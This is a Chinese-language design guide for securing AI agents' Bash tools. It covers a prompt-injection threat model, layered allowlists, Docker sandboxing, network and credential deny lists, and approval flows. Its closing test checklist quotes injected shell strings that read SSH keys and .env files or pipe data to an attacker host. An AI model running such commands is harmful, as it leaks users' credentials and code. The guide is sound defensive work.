# Bash Tool 安全设计

Bash tool 是让 AI agent 请求执行命令的能力。它的价值很高：可以跑测试、查文件、构建项目、验证修复结果。它的风险也同样高：一旦设计成“模型给什么命令就执行什么命令”，它就变成了一个可被 prompt injection 驱动的本机终端。

本文只讨论通用技术设计，不绑定任何具体项目。

## 目标

Bash tool 的目标不是提供完整终端，而是提供可控、可审计、可撤销的执行能力。

它应该满足：

- 模型可以请求执行常见开发任务。
- 系统可以在执行前判断风险。
- 高风险操作必须经过人类确认。
- 命令运行在明确边界内。
- 输出、退出码、耗时和失败原因可见。
- 失败不能静默。

它不应该满足：

- 允许模型执行任意 shell 字符串。
- 允许默认读取全部宿主文件系统。
- 允许默认访问网络。
- 允许默认访问凭证、SSH key、云厂商 token。
- 允许模型自己绕过权限系统。

## 威胁模型

Bash tool 的安全设计必须假设模型会看到不可信输入。

典型攻击来源：

- 用户粘贴的文本。
- issue、PR、网页、日志、README、脚本输出。
- 依赖包的安装脚本。
- 测试失败输出。
- 仓库内恶意文件名、分支名、commit message。

攻击者的目标通常是：

- 读取敏感文件。
- 外传 token 或源码。
- 修改仓库内容。
- 删除文件。
- 执行持久化后门。
- 借 CI 或开发机身份横向移动。

因此 Bash tool 的安全边界不能依赖“模型会判断危险”。模型只是请求方，不是安全边界。

## 总体架构

```text
User / Agent Prompt
        |
        v
Model proposes tool call
        |
        v
Bash Tool Gateway
        |
        +-- Parse request
        +-- Classify task type
        +-- Validate args
        +-- Apply allow / deny policy
        +-- Decide approval requirement
        |
        v
Execution Sandbox
        |
        +-- restricted cwd
        +-- restricted filesystem
        +-- restricted network
        +-- low-privilege user
        +-- resource limits
        |
        v
Process Runner
        |
        +-- spawn(command, args)
        +-- timeout
        +-- output cap
        +-- cancellation
        |
        v
Audit Log + Tool Result
```

关键点：模型不能直接进入 Process Runner。中间必须有 Gateway 和 Sandbox。

## 能力分层

推荐把 Bash tool 分成三层，而不是直接暴露任意 shell。

### Layer 1: 受控任务

受控任务是最安全的第一层。模型只传任务 ID 和结构化参数，系统映射到固定命令。

示例：

```ts
type TaskRequest =
  | { task: "git_status" }
  | { task: "git_diff"; base?: string }
  | { task: "search_text"; query: string; glob?: string }
  | { task: "run_tests"; target?: string }
  | { task: "build_project" };
```

后端 registry：

```ts
const tasks = {
  git_status: {
    command: "git",
    args: ["status", "--short"],
    writes: false,
    network: false,
    approval: "auto",
    timeoutMs: 10_000,
  },
  run_tests: {
    command: "npm",
    args: ["run", "test"],
    writes: "temp",
    network: false,
    approval: "confirm",
    timeoutMs: 60_000,
  },
};
```

优点：

- 命令集合小，容易审计。
- 参数结构化，容易验证。
- UI 可以解释每个任务的风险。
- 测试覆盖简单。

缺点：

- 灵活性有限。
- 新任务需要显式添加。

### Layer 2: 参数化命令

参数化命令允许模型选择命令，但参数仍被严格解析。

示例：

```ts
type CommandRequest = {
  command: "rg" | "git" | "npm";
  args: string[];
};
```

限制：

- `command` 必须在 allowlist 中。
- `args` 必须逐项验证。
- 禁止 shell metacharacters 不等于安全，但仍可作为一层早期拒绝。
- 不允许 `sh`、`bash`、`zsh`、`python -c`、`node -e` 这种二级解释器，除非进入更高风险模式。

这一层适合高级用户或编码 agent，不适合作为默认能力。

### Layer 3: 受限 shell

受限 shell 允许执行脚本，但必须放进强 sandbox。

示例：

```ts
type ShellRequest = {
  script: string;
  cwd?: string;
  reason: string;
};
```

必要条件：

- 默认人工确认。
- 默认禁网。
- 只挂载工作目录或临时目录。
- 不暴露宿主 env。
- 不暴露凭证。
- 使用低权限用户。
- 有硬超时和输出上限。
- 记录完整脚本、cwd、退出码、耗时。

这一层应该是可选高级能力，不应该是默认入口。

## 为什么不能直接执行 shell 字符串

不要这样做：

```ts
exec(modelGeneratedCommand);
```

原因：

- `;` 可以串联命令。
- `&&` 和 `||` 可以隐藏真实意图。
- `$(...)` 可以执行命令替换。
- 反引号可以执行命令替换。
- `>` 和 `>>` 可以写文件。
- `<` 可以读文件。
- `|` 可以把敏感数据传给外部命令。
- glob 可以扩大文件范围。
- env var 可以泄漏凭证。
- shell alias、rc 文件、PATH 污染会改变行为。

优先使用：

```ts
spawn(command, args, { shell: false });
```

即使使用 `spawn`，也仍然需要权限、sandbox 和审计。

## 权限模型

每个任务都应该声明风险属性。

```ts
type PermissionPolicy = {
  readsProject: boolean;
  writesProject: boolean;
  writesTemp: boolean;
  network: "none" | "allowlist" | "full";
  secrets: "none" | "scoped" | "host";
  approval: "auto" | "confirm" | "deny";
};
```

推荐默认：

| 能力 | 默认策略 |
|---|---|
| 读取当前工作目录 | 允许 |
| 写当前工作目录 | 需要确认 |
| 写临时目录 | 允许 |
| 删除文件 | 需要确认或拒绝 |
| 网络访问 | 默认拒绝 |
| 凭证访问 | 默认拒绝 |
| 执行未知二进制 | 默认拒绝 |
| 执行 package script | 需要确认 |

package script 需要特别小心。`npm test` 看起来像测试，但真实执行内容由 `package.json` 决定，可能包含任意命令。

## Sandbox 设计

Sandbox 是 Bash tool 的真正安全边界。

常见选择：

- Docker / container。
- macOS sandbox-exec 或 App Sandbox。
- Linux namespaces + seccomp + cgroups。
- Windows 低权限用户 + ACL + firewall。
- 远程一次性 VM。

通用限制：

```text
Filesystem:
  - read-only root
  - writable temp workspace
  - optional read-only project mount
  - no home directory secrets

Network:
  - default none
  - optional domain allowlist

Process:
  - low privilege user
  - pids limit
  - CPU limit
  - memory limit
  - wall-clock timeout

Linux capabilities:
  - drop all
  - no-new-privileges

Environment:
  - minimal env
  - no inherited host env
  - no token by default
```

Docker 示例：

```bash
docker run --rm \
  --network none \
  --cpus 1 \
  --memory 512m \
  --pids-limit 128 \
  --read-only \
  --cap-drop ALL \
  --security-opt no-new-privileges \
  --tmpfs /tmp:rw,noexec,nosuid,nodev,size=64m \
  --mount type=bind,source="$WORKSPACE",target=/workspace \
  --workdir /workspace \
  image \
  command args...
```

这不是完美安全，但比宿主 shell 好很多。

## 网络策略

网络访问应该默认关闭。

如果需要访问网络，应该使用显式 allowlist：

```ts
type NetworkPolicy =
  | { mode: "none" }
  | { mode: "allowlist"; domains: string[] }
  | { mode: "full"; approval: "confirm" };
```

不建议让 Bash tool 自由使用：

- `curl`
- `wget`
- `nc`
- `ssh`
- `scp`
- `rsync`
- package manager install scripts

如果产品需要 Web 访问，最好提供单独的受控 WebFetch 工具，而不是让 shell 联网。

## 凭证策略

默认不继承宿主环境变量。

禁止默认暴露：

- `GITHUB_TOKEN`
- `OPENAI_API_KEY`
- `AWS_*`
- `GOOGLE_*`
- `AZURE_*`
- `SSH_AUTH_SOCK`
- `HOME`
- `~/.ssh`
- `~/.config`
- 浏览器 cookie 或 profile

如果某个任务必须使用凭证，使用短期、最小权限、任务专用 token，并在日志里标记该任务使用了 scoped secret，但不要记录 secret 值。

## 审批模型

审批不应该只是“是否执行这个字符串”。审批界面应该展示结构化风险。

示例：

```text
Task: run_tests
Command: npm run test
CWD: /workspace/project
Writes: temp files only
Network: disabled
Timeout: 60s
Reason: Verify the changed parser behavior.
Risk: package script can execute project-defined commands.
```

自动批准适合：

- 只读任务。
- 参数受限任务。
- 无网络。
- 无凭证。
- 无项目写入。

需要确认适合：

- package scripts。
- 写项目文件。
- 删除或移动文件。
- 网络访问。
- 长时间任务。

默认拒绝适合：

- 任意 shell。
- 访问 home 目录。
- 访问 SSH key。
- 修改 git remote。
- force push。
- 安装全局依赖。
- 改系统配置。

## 输出处理

输出必须有限制。

建议：

- stdout 上限：64 KiB 到 1 MiB。
- stderr 上限：64 KiB 到 1 MiB。
- 超出后截断，并明确标记。
- 保存完整输出时要有 retention 策略。
- 对 token-like 字符串做 redaction。

Tool result 应包括：

```ts
type TaskResult = {
  ok: boolean;
  exitCode: number | null;
  signal: string | null;
  timedOut: boolean;
  durationMs: number;
  stdout: string;
  stderr: string;
  stdoutTruncated: boolean;
  stderrTruncated: boolean;
  commandDisplay: string;
  policy: {
    network: string;
    writes: string;
    approval: string;
  };
  error?: string;
};
```

## 失败模式

| 失败模式 | 应对 |
|---|---|
| 命令不存在 | 返回明确错误，不重试 |
| 参数非法 | 拒绝执行，告诉模型允许格式 |
| cwd 越界 | 拒绝执行 |
| 超时 | kill 进程树，返回 timedOut |
| 输出过大 | 截断并标记 |
| sandbox 启动失败 | 返回环境错误 |
| Docker daemon 不可用 | 返回状态错误 |
| 网络被禁止导致失败 | 返回 policy violation |
| 用户拒绝审批 | 返回 denied，不让模型伪装已执行 |
| 任务被取消 | kill 进程树，返回 cancelled |

失败结果应该进入模型上下文，但必须保持事实边界：没有执行就不能让模型说“测试通过”。

## 审计日志

每次执行都应该记录：

- request id。
- user/session id。
- task id。
- command 和 args。
- cwd。
- approval decision。
- sandbox profile。
- started at / finished at。
- duration。
- exit code。
- timeout。
- output truncated flags。
- policy violations。

日志不要记录 secret。必要时记录 hash 或 redacted value。

## 最小可行版本

第一版建议只支持受控任务。

```text
Supported:
  - git status --short
  - git diff
  - git log --oneline -n N
  - rg query path
  - npm run test
  - npm run build

Not supported:
  - arbitrary shell
  - network access
  - host home access
  - credentials
  - package install
  - system configuration
```

执行策略：

- `git status`、`git diff`、`git log`、`rg`：自动执行。
- `npm run test`、`npm run build`：用户确认。
- 全部使用 `spawn(command, args, { shell: false })`。
- 全部限时、限输出。
- package script 不自动联网，除非显式开启网络策略。

## 进阶版本

第二阶段可以加入：

- Docker sandbox。
- 按目录限制 cwd。
- 网络 allowlist。
- project write approvals。
- command policy 文件。
- 用户可配置 allow/deny。
- 任务历史 UI。
- 失败复现按钮。

第三阶段才考虑受限 shell。

受限 shell 必须满足：

- 每次确认。
- sandbox 强制启用。
- 无宿主 env。
- 无宿主 home。
- 禁网或 allowlist。
- 完整审计。

## 测试清单

单元测试：

- 未知 task 被拒绝。
- 参数类型错误被拒绝。
- cwd 越界被拒绝。
- shell metacharacters 不会进入 shell。
- `spawn` 使用固定 command + args。
- 输出截断。
- 超时 kill。
- 用户拒绝审批。

集成测试：

- 只读任务成功。
- package script 需要确认。
- sandbox 不可用时返回明确错误。
- 禁网任务无法访问网络。
- 凭证环境变量不会传入子进程。

安全回归测试：

- `; cat ~/.ssh/id_rsa` 不会执行。
- `$(cat .env)` 不会执行。
- `| curl attacker` 不会执行。
- `../../` cwd 越界被拒绝。
- 任务输出中的 token-like 字符串被 redacted。

## 推荐路线

推荐路线是：

```text
受控任务 runner
    -> 参数化命令 allowlist
    -> sandboxed package scripts
    -> 可配置权限策略
    -> 受限 shell
```

不要反过来从任意 shell 开始，再补安全规则。那会把最危险的能力作为默认形态，后续很难收回来。

## 核心原则

Bash tool 的安全不是一个开关，而是一组边界：

- 模型不是安全边界。
- shell 字符串不是 API。
- allowlist 优于 denylist。
- sandbox 优于审批。
- 禁网优于检测外传。
- 最小 env 优于 secret redaction。
- 结构化任务优于自由命令。
- 审计日志优于事后猜测。

如果必须给 AI agent 一个 Bash tool，先让它成为任务执行器，再逐步开放成受限终端。
